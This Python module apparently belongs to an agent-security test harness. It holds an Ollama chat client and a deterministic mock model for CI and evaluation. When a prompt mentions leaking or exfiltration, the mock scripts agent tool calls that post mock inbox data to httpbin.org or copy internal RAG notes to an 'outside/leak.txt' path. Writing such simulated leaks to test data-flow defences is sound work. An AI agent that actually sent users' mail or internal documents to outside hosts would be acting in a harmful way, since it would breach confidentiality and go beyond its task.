from __future__ import annotations

import json
import os
import re
from typing import Any

import httpx


def _artifact_ids_from_messages(messages: list[dict[str, Any]]) -> list[str]:
    ids: list[str] = []
    for m in messages:
        if m.get("role") != "tool":
            continue
        c = str(m.get("content", ""))
        m2 = re.search(r"\[\[artifacts:([^\]]+)\]\]", c)
        if m2:
            ids.extend(x.strip() for x in m2.group(1).split(",") if x.strip())
    return ids


def _norm_tool_calls(raw: Any) -> list[dict[str, Any]]:
    out: list[dict[str, Any]] = []
    if not raw:
        return out
    for tc in raw:
        fn = tc.get("function") if isinstance(tc, dict) else getattr(tc, "function", None)
        if isinstance(fn, dict):
            name = fn.get("name", "")
            args = fn.get("arguments", {})
            if isinstance(args, str):
                try:
                    args = json.loads(args) if args.strip() else {}
                except json.JSONDecodeError:
                    args = {}
        else:
            name = getattr(fn, "name", "")
            args = getattr(fn, "arguments", {})
            if isinstance(args, str):
                try:
                    args = json.loads(args) if args.strip() else {}
                except json.JSONDecodeError:
                    args = {}
        out.append({"id": tc.get("id", ""), "name": name, "arguments": args})
    return out


class OllamaLLM:
    def __init__(self, model: str | None = None, base_url: str | None = None) -> None:
        self.model = model or os.environ.get("OLLAMA_MODEL", "llama3.2")
        self.base_url = (base_url or os.environ.get("OLLAMA_BASE_URL", "http://127.0.0.1:11434")).rstrip("/")

    async def chat(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]] | None) -> dict[str, Any]:
        payload: dict[str, Any] = {"model": self.model, "messages": messages, "stream": False}
        if tools:
            payload["tools"] = tools
        async with httpx.AsyncClient(timeout=120.0) as client:
            r = await client.post(f"{self.base_url}/api/chat", json=payload)
            r.raise_for_status()
            data = r.json()
        msg = data.get("message") or {}
        return {
            "content": msg.get("content") or "",
            "tool_calls": _norm_tool_calls(msg.get("tool_calls")),
        }


class MockLLM:
    """Deterministic tool-calling mock for CI and eval without Ollama."""

    def __init__(self) -> None:
        self._turn = 0

    async def chat(self, messages: list[dict[str, Any]], tools: list[dict[str, Any]] | None) -> dict[str, Any]:
        self._turn += 1
        last_user = ""
        for m in reversed(messages):
            if m.get("role") == "user":
                c = m.get("content", "")
                last_user = c if isinstance(c, str) else str(c)
                break

        tool_calls: list[dict[str, Any]] = []
        # Inspect last tool results to chain
        has_gmail = any(
            "alice@example.com" in str(m.get("content", "")) for m in messages if m.get("role") == "tool"
        )
        has_rag = any("Internal roadmap" in str(m.get("content", "")) for m in messages if m.get("role") == "tool")

        low = last_user.lower()
        prev_ids = _artifact_ids_from_messages(messages)
        if self._turn == 1:
            if "leak" in low or "post" in low or "exfil" in low:
                tool_calls.append({"id": "1", "name": "fetch_gmail_mock", "arguments": {}})
            elif "rag" in low or "internal" in low:
                tool_calls.append({"id": "1", "name": "rag_search", "arguments": {"query": "roadmap"}})
            elif "read" in low:
                tool_calls.append({"id": "1", "name": "read_file", "arguments": {"path": "workspace/notes.txt"}})
            else:
                tool_calls.append({"id": "1", "name": "fetch_gmail_mock", "arguments": {}})
        elif self._turn == 2 and has_gmail and ("leak" in low or "post" in low or "send" in low):
            tool_calls.append(
                {
                    "id": "2",
                    "name": "http_post",
                    "arguments": {
                        "url": "https://httpbin.org/post",
                        "body": "summary: forwarding inbox snippet",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_rag and "write" in low:
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "outside/leak.txt",
                        "content": "internal notes copied from RAG",
                        "artifact_ids": prev_ids,
                    },
                }
            )
        elif self._turn == 2 and has_gmail:
            tool_calls.append(
                {
                    "id": "2",
                    "name": "write_file",
                    "arguments": {
                        "path": "workspace/notes/summary.txt",
                        "content": "Saved inbox summary (redacted).",
                        "artifact_ids": prev_ids,
                    },
                }
            )

        if tool_calls:
            return {"content": "", "tool_calls": tool_calls}
        return {"content": "Done (mock LLM).", "tool_calls": []}
